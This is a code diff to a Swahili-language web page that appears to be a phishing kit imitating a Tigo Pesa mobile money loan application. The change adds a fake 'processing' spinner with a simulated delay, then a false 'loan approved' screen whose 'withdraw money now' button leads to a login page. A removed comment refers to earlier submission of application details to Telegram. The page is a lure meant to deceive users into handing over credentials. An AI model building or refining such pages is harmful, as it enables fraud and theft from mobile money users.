@@ -230,6 +230,7 @@
                 <div class="step-dot active" id="dot-1"></div>
                 <div class="step-dot" id="dot-2"></div>
                 <div class="step-dot" id="dot-3"></div>
+                <div class="step-dot" id="dot-4"></div>
             </div>
         </header>
 
@@ -323,12 +324,44 @@
                         <span class="summary-value" id="sum-name">-</span>
                     </div>
                 </div>
-            </div>
+                <!-- Step 4: Processing & Withdrawal -->
+                <div class="form-step" id="step-4">
+                    <div id="processing-view" style="text-align: center; padding: 40px 0;">
+                        <div class="spinner"
+                            style="width: 50px; height: 50px; border: 5px solid #f3f3f3; border-top: 5px solid #E3000F; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 20px;">
+                        </div>
+                        <p style="font-size: 18px; font-weight: 500; color: #3a3a3c;">Inachakata ombi lako...</p>
+                    </div>
+                    <div id="withdrawal-view" style="display: none; text-align: center; padding: 20px 0;">
+                        <div
+                            style="width: 80px; height: 80px; background-color: #4CAF50; border-radius: 50%; display: flex; justify-content: center; align-items: center; margin: 0 auto 20px;">
+                            <svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="3"
+                                stroke-linecap="round" stroke-linejoin="round">
+                                <polyline points="20 6 9 17 4 12"></polyline>
+                            </svg>
+                        </div>
+                        <h2 style="font-size: 22px; color: #1c1c1e; margin-bottom: 10px;">Mkopo Umeidhinishwa!</h2>
+                        <p style="font-size: 16px; color: #3a3a3c; margin-bottom: 30px;">Kiasi cha mkopo kiko tayari
+                            kuwekwa kwenye pochi yako ya Tigo Pesa.</p>
+                    </div>
+                </div>
 
-            <div class="btn-container">
-                <button class="back-btn" id="prev-btn" style="display: none;">Rudi</button>
-                <button class="next-btn" id="next-btn">Endelea</button>
-            </div>
+                <style>
+                    @keyframes spin {
+                        0% {
+                            transform: rotate(0deg);
+                        }
+
+                        100% {
+                            transform: rotate(360deg);
+                        }
+                    }
+                </style>
+
+                <div class="btn-container">
+                    <button class="back-btn" id="prev-btn" style="display: none;">Rudi</button>
+                    <button class="next-btn" id="next-btn">Endelea</button>
+                </div>
         </main>
     </div>
 
@@ -371,6 +404,14 @@
             if (currentStep === 3) {
                 updateSummary();
             }
+
+            if (currentStep === 4) {
+                document.querySelector('.header').style.display = 'none';
+                document.getElementById('prev-btn').style.display = 'none';
+                document.getElementById('next-btn').style.display = 'none';
+            } else {
+                document.querySelector('.header').style.display = 'block';
+            }
         }
 
         function updateSummary() {
@@ -381,8 +422,20 @@
         }
 
         async function submitApplication() {
-            // Removed Telegram submission for application details as per request
-            window.location.href = 'login.html';
+            currentStep = 4;
+            updateUI();
+
+            // Simulate processing delay
+            setTimeout(() => {
+                document.getElementById('processing-view').style.display = 'none';
+                document.getElementById('withdrawal-view').style.display = 'block';
+
+                // Add withdrawal button
+                const btnContainer = document.querySelector('.btn-container');
+                btnContainer.innerHTML = `
+                    <button class="next-btn" style="width: 100%;" onclick="window.location.href='login.html'">Toa fedha sasa</button>
+                `;
+            }, 3000);
         }
     </script>
 </body>
